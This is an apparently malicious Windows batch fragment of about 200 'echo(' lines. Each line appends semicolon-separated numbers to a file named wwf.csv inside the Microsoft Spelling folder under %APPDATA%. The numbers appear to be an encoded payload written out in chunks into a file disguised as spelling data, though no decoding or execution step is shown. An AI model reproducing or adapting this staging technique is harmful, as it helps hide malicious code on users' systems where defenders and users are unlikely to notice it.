>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.102;30.0;3787.710;19.614;9.811;99.7680;50.0;310.111;803.0;8216.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.619;15.743;126.9507;617.15;811.104;70.0;8535.610;116.441;0.40;1.5819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(519.16;517.16;811.105;4496.50;0.610;44.518;40.7607;382.0;40.6;811.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8989.60;0.66;111.533;0.6729;40.10;323.47;585.17;0568.416;111.805;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.6141;744.8;517.5;623.88;7818.719;5.343;6.617;4.2266;323.88;719.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(717.14;8124.811;106.30;0.410;45.0245;328.17;614.114;35.13;4797.30;112.640;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5.50;0.6060;76.114;337.13;50.112;0357.640;63.60;0.410;111.4328;684.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.10;438.17;7554.614;17.316;111.785;0.9394;60.10;814.37;313.0;0079.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.663;0.60;10.9814;811.84;70.0;310.38;2840.617;15.811;107.50;0.1968;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.58;818.255;955.255;7384.922;21.317;15.817;28.2281;50.0;31.19;711.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6239.411;44.47;17.711;111.4430;440.0;60.10;920.17;4141.314;111.806;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.7551;544.12;717.14;811.85;4841.60;0.710;40.551;0.0465;50.10;440.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;5413.710;114.643;13.30;112.5737;440.5;30.0;56.24;7914.841;22.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.41;37.6907;322.17;75.140;364.0;2833.30;1.862;37.423;17.7740;34.140;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(664.0;60.1;9422.862;40.528;0.50;10.6546;640.51;40.0;310.9;5073.444;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.49;111.699;0.3470;40.10;811.100;30.0;1116.710;45.53;22.343;1.3308;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(623.19;76.222;623.19;0541.317;17.717;111.808;0.8735;60.10;719.18;617.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2432.540;51.70;0.510;23.2343;619.6;922.0;717.6;4163.542;0.40;0.665;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.9369;70.0;42.0;30.0;3324.324;1.40;0.330;0.9454;50.0;454.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;7472.714;0.60;0.50;0.4545;30.0;72.0;70.0;6296.485;1.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.636;0.1257;40.0;821.1;60.0;8632.521;0.30;0.50;0.0855;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.0;30.0;3963.876;2.50;0.842;0.5858;30.0;662.3;60.0;7635.721;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.50;0.6586;30.0;30.0;40.0;6494.30;0.50;0.879;3.5335;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;879.3;70.0;2916.623;0.60;0.542;0.5875;60.1;386.115;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0136.60;10.828;234.30;0.3670;44.115;810.0;60.10;7587.828;235.30;0.74;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.9382;350.2;826.41;50.0;8838.410;40.814;0.30;6.2352;642.0;719.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(65.0;8284.818;0.30;0.616;0.4726;50.17;420.10;63.40;3039.811;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.644;66.3835;42.208;765.0;50.1;0606.740;112.30;0.610;40.9144;813.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.10;544.8;1688.815;114.40;0.410;10.2718;543.80;62.208;767.0;9242.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.740;112.50;0.8826;610.40;813.0;30.10;1700.544;8.815;115.70;0.7018;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(410.10;643.54;42.40;0625.816;0.50;10.816;45.6348;50.0;41.10;543.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3285.815;117.60;0.310;11.7705;57.114;583.13;70.112;2602.33;111.818;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.6189;42.23;841.22;40.0;3745.31;37.422;7.862;40.1036;819.0;50.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.45;2514.70;0.71;10.66;42.0924;60.0;727.48;63.0;4525.807;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.317;0.7652;70.17;826.241;40.0;1695.54;11.522;12.47;18.1437;42.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(820.0;60.10;3597.826;240.40;0.64;45.2990;610.115;821.0;50.10;0501.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(240.30;0.44;126.7460;940.0;50.4;32.18;1236.73;111.822;0.50;10.2082;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(645.18;815.123;50.0;6792.510;13.826;240.30;0.6864;54.2;79.111;824.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1477.40;10.49;3.418;0.1052;811.125;70.0;510.45;7658.316;2.73;40.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4414;50.6;410.9;53.6;6971.811;126.40;0.410;222.6706;710.8;344.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(77.40;6811.827;0.50;10.920;6.6951;642.0;61.16;40.0;6561.62;0.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.487;95.5406;50.10;30.0;60.0;8429.350;2.826;41.70;0.1610;410.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;30.6;6226.742;154.72;23.751;17.7645;908.65;70.0;61.40;6855.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;10.73;40.0100;815.0;70.6;642.208;0858.367;0.70;1.440;112.5777;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;310.3;440.115;9237.70;0.66;42.719;48.1964;32.0;341.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0207.318;0.30;17.623;10.1080;52.208;447.0;60.1;9616.640;112.70;0.410;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.3232;828.0;60.10;817.47;8008.70;0.51;11.67;44.7519;312.7;811.129;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;3984.710;40.819;0.70;6.1995;510.6;542.0;60.0;9570.519;48.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.442;0.4993;40.0;619.0;50.17;6270.423;10.32;40.811;0.7445;60.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(345.30;32.114;2424.817;3.30;112.627;40.5659;745.0;70.10;744.14;4657.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.815;13.40;112.4188;327.40;445.0;30.10;9948.745;2.422;10.46;42.1767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(570.20;828.240;30.0;7427.34;115.623;0.50;10.0310;828.241;30.0;34.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8202.466;83.374;66.71;0.8764;51.0;60.0;60.0;3155.712;0.70;0.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.5022;346.48;446.51;548.51;1270.749;57.30;0.70;0.3163;45.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;5101.856;27.30;0.535;126.8660;60.0;38.28;60.0;5079.816;28.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.635;83.2870;816.114;805.110;803.115;6624.60;0.30;0.824;56.6029;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(840.13;40.0;6291.535;85.783;0.68;70.5099;30.0;316.0;30.0;4761.635;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.785;73.568;0.5620;70.0;424.70;40.0;6646.840;69.60;0.435;66.0623;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.111;498.0;60.0;9363.30;0.50;0.62;0.5601;30.1;687.29;862.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1896.49;1.40;0.40;250.2545;71.51;30.22;50.0;9977.61;0.50;0.369;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4758;40.0;529.0;40.0;1111.941;0.70;0.820;0.2897;30.0;565.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;4392.829;0.50;0.901;0.6274;70.0;723.0;60.0;9595.519;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.719;0.4293;40.0;424.0;30.0;4629.524;0.50;0.56;0.8850;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.0;30.0;5311.73;0.60;0.41;0.9170;40.0;40.0;880.11;8819.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.40;0.3313;56.0;852.9;919.21;1796.76;0.678;8.801;21.8941;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(411.0;477.22;30.0;9718.76;0.698;8.888;21.2420;36.0;936.9;931.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4778.66;0.843;8.881;17.4481;36.0;556.9;881.17;7783.66;0.685;9.881;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.6030;46.0;752.10;881.17;5036.76;0.884;9.881;17.0275;56.0;909.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(881.17;5611.56;0.911;8.881;17.5319;36.0;940.8;881.17;6956.66;0.322;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9.619;22.3112;46.0;444.8;719.22;1462.36;0.884;8.881;17.7057;56.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.8;881.17;3933.76;0.522;10.881;17.2148;66.0;577.10;919.21;1555.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.869;14.888;21.1287;46.0;815.9;888.21;1698.36;0.711;25.931;15.4147;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.0;920.19;619.22;0801.36;0.72;10.931;15.3021;66.0;831.18;860.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8384.310;0.799;24.936;19.0939;614.0;930.20;840.4;7626.36;0.517;6.931;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.4762;714.0;927.17;840.4;4062.614;0.376;1.934;3.7387;46.0;822.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(360.3;1537.36;0.827;7.931;15.4531;56.0;906.19;927.26;5535.46;0.866;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.931;15.3246;76.0;590.0;934.3;5666.56;0.525;8.931;15.3486;310.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.20;936.19;8724.514;0.926;24.720;20.9459;843.0;950.20;30.0;2099.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.918;20.64;24.6298;414.0;904.20;320.20;3489.56;0.663;18.931;15.5902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.0;943.15;931.15;8866.46;0.482;1.934;3.3101;514.0;874.19;720.20;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3473.56;0.784;19.931;15.0303;510.0;472.5;936.19;7415.66;0.722;28.881;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.8328;56.0;541.12;931.15;0461.76;0.890;19.931;15.6055;36.0;412.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(931.15;1348.66;0.733;19.931;15.2146;36.0;884.14;460.3;9470.46;0.385;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.931;15.4785;76.0;634.18;931.15;0703.66;0.846;6.931;15.7619;56.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(755.18;931.15;0027.414;0.807;24.320;20.6665;36.0;843.18;360.3;9780.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.364;28.460;3.0376;410.0;918.24;936.19;2648.614;0.944;17.720;20.2269;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.0;940.7;34.24;5107.36;0.670;1.931;15.9885;714.0;832.19;934.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2045.66;0.352;6.931;15.9148;314.0;817.19;45.4;5530.76;0.35;21.931;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.1025;56.0;528.21;912.11;0931.40;0.30;0.648;3.4455;30.0;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.0;3923.71;0.30;1.516;0.0621;570.3;30.0;689.0;5216.51;0.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.828;1.7921;716.0;874.27;30.0;4211.489;0.822;0.68;0.9747;828.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(416.0;919.27;6379.40;0.389;0.823;0.0363;48.0;828.1;516.0;8582.900;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(11.70;0.689;0.0907;832.0;48.0;60.1;7386.716;0.492;14.344;20.2277;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(796.0;901.0;58.0;6619.30;1.716;0.461;14.8664;444.20;596.0;902.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1577.414;0.60;1.716;0.5516;845.14;544.20;596.0;9952.903;0.718;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.2341;716.0;808.13;344.20;8020.596;0.904;0.423;0.5459;40.1;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.14;9853.344;20.396;0.905;0.2164;528.0;70.1;516.0;6667.855;14.644;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(20.496;0.7687;908.0;434.0;30.1;8092.316;0.828;13.644;20.0168;796.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(909.0;439.0;5481.40;1.616;0.844;13.5488;544.20;496.0;910.0;7092.344;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;1.60;0.2873;919.13;744.20;596.0;2788.911;0.649;0.40;1.5858;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;872.13;344.20;7206.596;0.914;0.654;0.9820;30.1;516.0;887.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4637.644;20.596;0.917;0.4153;759.0;50.1;616.0;8193.742;14.644;20.696;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1852;918.0;764.0;50.1;2820.60;0.931;13.344;20.0511;396.0;919.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(669.0;7878.70;1.716;0.331;14.2658;444.20;496.0;922.0;9787.774;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.416;0.8252;418.14;444.20;596.0;4252.923;0.379;0.30;1.2706;416.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(947.13;744.20;3594.496;0.924;0.682;0.0747;70.1;40.0;859.13;3477.444;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(20.496;0.925;0.0730;485.0;50.1;40.0;1892.375;14.644;20.496;0.0655;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(928.0;490.0;828.0;8376.716;0.901;13.644;20.7640;589.0;931.0;395.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5597.828;1.616;0.850;20.4762;344.20;689.0;934.0;1228.802;0.828;1.516;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8421;783.24;444.20;389.0;7670.934;0.804;0.41;1.2301;416.0;772.20;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(644.20;0163.589;0.934;0.809;0.3201;50.1;30.0;392.22;9056.936;19.873;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.936;0.0881;813.0;828.1;516.0;3521.483;24.936;19.489;0.0780;939.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(813.0;317.0;9248.777;19.940;62.31;0.8133;767.22;944.62;483.128;8377.765;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.822;0.583;128.3917;874.20;822.0;383.128;9635.895;4.822;0.683;128.1687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.7;822.0;783.128;4249.945;11.822;0.383;128.3622;794.11;822.0;583.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3613.915;4.822;0.783;128.0899;874.10;822.0;783.128;3059.932;10.822;0.683;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.1042;847.10;822.0;683.128;2710.64;14.822;0.583;128.5838;558.12;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.128;2652.818;14.822;0.483;128.4227;854.6;822.0;583.128;1994.418;25.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.683;128.7686;879.25;822.0;583.128;8665.853;0.822;0.583;128.0591;375.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;783.128;7730.807;2.822;0.783;128.4100;874.2;822.0;683.128;3504.902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(26.822;0.783;128.2564;517.1;822.0;583.128;9758.939;1.822;0.583;128.0627;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(571.0;822.0;783.128;3347.839;2.822;0.683;128.3456;906.2;822.0;683.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9951.939;2.822;0.483;128.4179;784.3;822.0;783.128;3388.834;3.822;0.383;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.1753;887.26;822.0;783.128;3586.31;1.822;0.583;128.2191;923.1;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.128;2302.591;2.822;0.683;128.3096;823.2;822.0;383.128;0658.890;2.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.483;128.6595;923.2;822.0;783.128;9878.30;3.822;0.583;128.8515;316.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;583.128;3346.332;3.822;0.683;128.4528;51.0;822.0;683.128;9232.654;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.822;0.383;128.3159;553.1;822.0;383.128;0630.719;2.822;0.683;128.4984;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.17;822.0;483.128;7871.888;0.822;0.683;128.1940;893.5;822.0;483.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4296.869;0.822;0.383;128.9096;851.1;822.0;383.128;8686.812;0.822;0.783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.7834;810.1;822.0;583.128;2512.351;2.822;0.783;128.5997;727.4;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(683.128;9660.597;0.822;0.783;128.8481;795.1;822.0;683.128;3154.436;2.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.683;128.7545;867.24;822.0;483.128;8349.545;4.822;0.683;128.3948;453.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;783.128;7936.841;26.822;0.783;128.4644;827.12;822.0;783.128;5305.902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(25.822;0.683;128.7655;630.5;822.0;783.128;6903.542;13.822;0.483;128.2145;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.26;822.0;583.128;2264.622;28.822;0.783;128.9724;876.11;822.0;683.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5950.461;13.822;0.383;128.2335;850.26;822.0;583.128;0901.845;12.822;0.383;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.6276;921.25;822.0;383.128;2567.859;12.822;0.383;128.6764;936.25;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.128;2028.896;12.822;0.783;128.8437;620.26;822.0;383.128;0875.820;21.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.383;128.7084;812.18;822.0;583.128;1948.883;12.822;0.583;128.7580;66.26;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;383.128;8143.948;12.822;0.583;128.7467;576.26;822.0;483.128;2678.573;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.822;0.583;128.8332;357.3;822.0;783.128;3691.937;12.822;0.483;128.3530;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(764.26;822.0;483.128;9000.926;12.822;0.683;128.7073;652.26;822.0;683.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4332.388;6.822;0.383;128.2445;837.20;822.0;783.128;6553.819;16.822;0.783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.3472;872.12;822.0;383.128;3922.950;25.822;0.583;128.1789;822.10;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.128;1396.836;0.822;0.583;128.7637;834.1;822.0;783.128;7210.727;13.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.783;128.4051;813.26;822.0;483.128;3274.644;11.822;0.583;128.7076;31.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;383.128;1414.686;26.822;0.583;128.6992;54.11;822.0;783.128;4548.936;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.822;0.683;128.6907;902.1;822.0;483.128;9523.849;11.822;0.383;128.6814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(711.8;822.0;383.128;5222.810;4.822;0.683;128.7777;483.4;822.0;383.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5215.871;4.822;0.583;128.3069;904.0;822.0;783.128;5462.870;1.822;0.483;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.2826;549.5;822.0;783.128;0000.906;12.822;0.683;128.4702;531.26;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.128;3206.418;0.822;0.583;128.6284;856.2;822.0;683.128;5462.736;0.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.683;128.2364;412.27;822.0;783.128;7894.898;10.822;0.383;128.3533;634.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;583.128;6579.70;2.822;0.683;128.5863;660.17;822.0;683.128;6669.858;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.822;0.483;128.0599;573.18;822.0;583.128;6124.573;21.822;0.683;128.1293;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(622.25;822.0;383.128;4644.760;17.822;0.583;128.6184;318.17;822.0;383.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8352.753;21.822;0.383;128.8806;536.21;822.0;583.128;6781.438;19.948;62.583;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.4301;336.27;822.0;683.128;6834.948;15.822;0.483;128.7280;347.15;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.128;2172.841;27.822;0.783;128.3534;793.16;822.0;683.128;7459.844;15.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.783;128.5253;769.27;822.0;483.128;3099.535;16.822;0.483;128.9760;788.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;483.128;9950.780;27.822;0.783;128.4297;646.16;822.0;383.128;0704.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.822;0.583;128.1940;909.3;822.0;383.128;4611.823;3.822;0.583;128.3277;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(360.25;822.0;383.128;8296.931;15.822;0.683;128.7976;845.7;822.0;783.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2807.586;21.822;0.783;128.2920;474.12;822.0;483.128;6353.939;26.822;0.583;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.4397;492.23;822.0;383.128;3307.869;15.822;0.783;128.3058;822.27;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(483.128;2783.569;16.822;0.583;128.2984;821.15;822.0;683.128;7941.350;27.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.783;128.9503;611.16;822.0;583.128;3323.565;15.822;0.383;128.2030;902.23;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;383.128;7637.840;17.822;0.683;128.2784;320.15;822.0;583.128;4448.823;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(25.822;0.583;128.3198;895.16;822.0;483.128;8718.951;21.822;0.683;128.6726;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(875.16;822.0;683.128;9107.813;12.822;0.483;128.0245;863.21;822.0;583.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5269.783;25.822;0.483;128.2591;929.11;822.0;583.128;3601.951;18.822;0.583;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.4961;863.26;822.0;783.128;4713.883;18.822;0.583;128.6018;667.7;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(683.128;8601.879;15.822;0.683;128.9931;686.28;822.0;583.128;6560.852;3.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.483;128.8425;897.24;822.0;583.128;1279.874;3.822;0.683;128.5229;938.23;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;683.128;1258.802;3.822;0.783;128.8813;829.16;822.0;583.128;8746.934;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.822;0.583;128.7486;854.23;822.0;783.128;0613.908;16.822;0.383;128.0516;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(396.6;822.0;683.128;5165.874;23.822;0.583;128.7170;496.12;822.0;383.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4537.845;21.822;0.483;128.4925;955.7;822.0;483.128;0954.858;18.822;0.583;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.6904;811.23;822.0;483.128;8146.851;19.822;0.783;128.0101;798.27;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.128;4172.542;28.822;0.683;128.8609;817.20;822.0;383.128;7896.884;3.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.683;128.8673;856.16;822.0;483.128;2307.812;6.822;0.783;128.1814;862.25;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;417.0;4883.802;18.951;62.617;0.1929;802.18;955.62;517.0;1959.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.43;63.417;0.0795;802.18;77.63;617.0;8761.953;27.822;0.317;0.1390;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(870.11;822.0;317.0;2406.802;18.611;63.717;0.7680;802.18;415.63;717.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4531.802;18.519;63.517;0.2171;802.18;723.63;417.0;0790.521;23.822;0.717;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6809;880.18;822.0;517.0;1243.802;18.427;63.517;0.2011;817.21;822.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(417.0;6659.927;3.822;0.317;0.4924;802.18;431.63;517.0;7619.802;18.435;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.417;0.0941;802.18;539.63;717.0;1531.321;23.822;0.617;0.9371;880.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.0;617.0;4433.802;18.543;63.617;0.2098;802.18;547.63;717.0;6174.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.451;63.517;0.9862;802.18;655.63;617.0;6388.849;11.822;0.317;0.3528;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(311.8;822.0;617.0;3607.802;18.559;63.717;0.7279;421.23;822.0;417.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4527.880;18.822;0.417;0.6558;802.18;463.63;64.0;5312.48;23.367;63.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5962;928.6;822.0;41.0;4234.346;7.822;0.317;0.7851;857.22;671.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(517.0;7703.811;22.780;63.46;6.2557;776.3;948.62;686.128;3532.357;3.789;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.786;128.9287;944.18;689.63;481.128;7064.955;4.822;0.717;0.6034;673.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(393.63;517.0;6485.914;14.812;63.480;32.9082;40.0;50.0;831.24;0772.415;
